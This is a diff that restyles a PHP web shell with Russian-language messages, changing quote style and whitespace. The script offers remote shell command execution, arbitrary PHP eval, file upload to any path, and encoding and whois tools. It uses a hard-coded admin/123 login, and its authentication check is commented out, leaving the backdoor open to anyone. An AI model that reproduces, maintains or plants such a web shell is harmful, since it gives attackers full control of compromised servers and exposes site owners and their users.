@@ -28,12 +28,11 @@ a{text-decoration:none;}
 $self = $_SERVER['PHP_SELF'];
 $docr = $_SERVER['DOCUMENT_ROOT'];
 $sern = $_SERVER['SERVER_NAME'];
-$tend = "</tr></form></table><br><br><br><br>";
+$tend = '</tr></form></table><br><br><br><br>';
 
 // Configuration
-$login = "admin";
-$pass = "123";
-
+$login = 'admin';
+$pass = '123';
 
 /*/ Authentication
 if (!isset($_SERVER['PHP_AUTH_USER'])) {
@@ -47,14 +46,12 @@ if(empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_PW']<>$pass || empty($_S
 }
 */
 
-
-
 if (!empty($_GET['ac'])) {
     $ac = $_GET['ac'];
 } elseif (!empty($_POST['ac'])) {
     $ac = $_POST['ac'];
 } else {
-    $ac = "shell";
+    $ac = 'shell';
 }
 
 // Menu
@@ -66,11 +63,9 @@ echo "
 |<a href=$self?ac=whois>Whois</a>|
 <br><br><br><pre>";
 
-
 switch ($ac) {
-
 // Shell
-case "shell":
+case 'shell':
 
 echo <<<HTML
 <b>Shell</b>
@@ -90,9 +85,8 @@ if (!empty($_POST['c'])) {
 echo "</textarea></td>$tend";
 break;
 
-
 //PHP Eval Code execution
-case "eval":
+case 'eval':
 
 echo <<<HTML
 <b>PHP Eval Code</b>
@@ -112,9 +106,8 @@ if (isset($_POST['ephp'])) {
 }
 break;
 
-
 //Text tools
-case "tools":
+case 'tools':
 
 echo <<<HTML
 <b>Tools</b>
@@ -137,25 +130,23 @@ HTML;
 
 if (!empty($_POST['tot']) && !empty($_POST['tac'])) {
     switch ($_POST['tac']) {
-
-case "1":
-echo "Раскодированный текст:<b>" .base64_decode($_POST['tot']). "</b>";
+case '1':
+echo 'Раскодированный текст:<b>' . base64_decode($_POST['tot']) . '</b>';
     break;
 
-    case "2":
-echo "Кодированный текст:<b>" .base64_encode($_POST['tot']). "</b>";
+    case '2':
+echo 'Кодированный текст:<b>' . base64_encode($_POST['tot']) . '</b>';
     break;
 
-    case "3":
-echo "Кодированный текст:<b>" .md5($_POST['tot']). "</b>";
+    case '3':
+echo 'Кодированный текст:<b>' . md5($_POST['tot']) . '</b>';
     break;
 }
 }
 break;
 
-
 // Uploading
-case "upload":
+case 'upload':
 
 echo <<<HTML
 <b>File Upload</b>
@@ -173,25 +164,24 @@ $tend
 HTML;
 
 if (isset($_POST['path'])) {
-    $uploadfile = $_POST['path'].$_FILES['file']['name'];
-    if ($_POST['path']=="") {
+    $uploadfile = $_POST['path'] . $_FILES['file']['name'];
+    if ('' == $_POST['path']) {
         $uploadfile = $_FILES['file']['name'];
     }
 
     if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
         echo "Файло успешно загружен в папку $uploadfile\n";
-        echo "Имя:" .$_FILES['file']['name']. "\n";
-        echo "Размер:" .$_FILES['file']['size']. "\n";
+        echo 'Имя:' . $_FILES['file']['name'] . "\n";
+        echo 'Размер:' . $_FILES['file']['size'] . "\n";
     } else {
-        print "Не удаётся загрузить файло. Инфа:\n";
+        echo "Не удаётся загрузить файло. Инфа:\n";
         print_r($_FILES);
     }
 }
 break;
 
-
 // Whois
-case "whois":
+case 'whois':
 echo <<<HTML
 <b>Whois</b>
 <table>
@@ -211,18 +201,18 @@ echo <<<HTML
 $tend
 HTML;
 
-if (isset($_POST['wq']) && $_POST['wq']<>"") {
+if (isset($_POST['wq']) && '' != $_POST['wq']) {
     if (empty($_POST['wser'])) {
-        $wser = "whois.ripe.net";
+        $wser = 'whois.ripe.net';
     } else {
         $wser = $_POST['wser'];
     }
 
-    $querty = $_POST['wq']."\r\n";
+    $querty = $_POST['wq'] . "\r\n";
     $fp = fsockopen($wser, 43);
 
     if (!$fp) {
-        echo "Не могу открыть сокет";
+        echo 'Не могу открыть сокет';
     } else {
         fputs($fp, $querty);
         while (!feof($fp)) {
@@ -232,8 +222,6 @@ if (isset($_POST['wq']) && $_POST['wq']<>"") {
     }
 }
 break;
-
-
 }
 ?>
 </pre>
